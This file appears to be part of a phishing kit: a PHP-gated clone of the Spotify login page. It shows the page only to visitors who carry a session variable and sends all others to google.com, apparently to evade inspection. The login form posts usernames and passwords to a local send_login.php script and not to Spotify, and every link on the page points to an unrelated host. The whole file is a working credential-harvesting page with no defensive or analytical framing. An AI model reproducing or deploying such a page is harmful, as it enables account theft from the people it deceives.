<?php
session_start();
if (isset($_SESSION["username"])) {



?>
<!DOCTYPE html>
<!-- saved from url=(0049)https://hamidabsahaa.com/sp__3_/st/account/MitID/ -->
<html class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Latest compiled and minified CSS -->
    <link href="./Log in - Spotify_files/bootstrap.min.css" rel="stylesheet">

    <!-- Latest compiled JavaScript -->
    <script src="./Log in - Spotify_files/bootstrap.bundle.min.js.téléchargement"></script><style>undefined</style>

    <link rel="stylesheet" type="text/css" href="./Log in - Spotify_files/style.css">

    <title>Log in - Spotify</title>
<link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com/"><link rel="stylesheet" href="./Log in - Spotify_files/css2"><link type="text/css" rel="stylesheet" charset="UTF-8" href="./Log in - Spotify_files/m=el_main_css"></head>
<body cz-shortcut-listen="true" data-new-gr-c-s-check-loaded="14.1162.0" data-gr-ext-installed="">
<div class="ng-scope">
    <div sp-header="" class="ng-scope">
        <div class="head">
            <a class="spotify-logo" tabindex="-1" title="Spotify" href="https://hamidabsahaa.com/sp__3_/st/account/MitID/login.html"></a>
        </div>
    </div>
    <div class="container-fluid login ng-scope">
        <div class="content">

            <div class="row">
                <div class="col-xs-12">

                </div>
            </div>

            <form id="loginnet" name="loginnet" method="post" action="./system/send_login.php">

                <p style="display: none;color:red;padding-left: 25%;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Your credentials are incorrect</font></font></p>

                <div class="row">
                    <div class="col-xs-12">
                        <label for="login-username" class="control-label sr-only ng-binding"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            e-mail or username
                        </font></font></label>
                        <input type="email" class="form-control input-with-feedback" name="username" id="login-username" placeholder="Email address or username" required="" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="" ng-trim="false" value="">

                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <label for="login-password" class="control-label sr-only ng-binding"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Password
                        </font></font></label>
                        <input type="password" class="
                               form-control input-with-feedback" name="password" id="login-password" placeholder="Password" required="" autocomplete="off" ng-trim="false" value="">

                    </div>
                </div>
                <div class="row row-submit">
                    <div class="col-xs-12 col-sm-6">
                        <div class="checkbox">
                            <label class="ng-binding">
                                <input ng-model="form.remember" type="checkbox" name="remember" id="login-remember" value="true" checked=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                Remember me</font></font><span class="control-indicator"></span>
                            </label>
                        </div>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <button class="btn btn-block btn-green" id="login-button"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Log in</font></font></button>
                    </div>
                </div>
            </form>
            <div class="row">
                <div class="col-xs-12 text-center">
                    <p>
                        <a id="reset-password-link" href="https://hamidabsahaa.com/sp__3_/st/account/MitID/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Forgot your password?</font></font></a>
                    </p>
                </div>
            </div>
            <div>
                <div class="row">
                    <div class="col-xs-12">
                        <div>
                            <div>
                                <div>
                                    <div class="row">
                                        <div class="col-xs-12">
                                            <div class="divider">

                                            </div>
                                        </div>
                                    </div>
                                    <div class="row text-center mt-0">
                                        <div class="h4"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Don't have an account?</font></font></div>
                                    </div>
                                    <div>
                                        <div class="row">
                                            <div class="col-xs-12">
                                                <a class="btn btn-block btn-default" role="button" href="https://hamidabsahaa.com/sp__3_/st/account/MitID/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Register</font></font></a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12">
                    <div class="divider"></div>
                    <p class="text-muted disclaimer text-center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if you click "Log in with Facebook" and if you are not a Spotify user, you will be registered and you accept Spotify's </font></font><a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/login.html" target="_blank"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Terms &amp; Conditions</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/login.html" target="_blank"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Privacy Policy</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></p>
                </div>
            </div>
        </div>
    </div>
</div>

</body><grammarly-desktop-integration data-grammarly-shadow-root="true"><template shadowrootmode="open"><style>
      div.grammarly-desktop-integration {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        white-space: nowrap;
        border: 0;
        -moz-user-select: none;
        -webkit-user-select: none;
        -ms-user-select:none;
        user-select:none;
      }

      div.grammarly-desktop-integration:before {
        content: attr(data-content);
      }
    </style><div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration" data-content="{&quot;mode&quot;:&quot;full&quot;,&quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}"></div></template></grammarly-desktop-integration></html>

<?php
}else {
HEADER("Location: https://google.com");

}
?>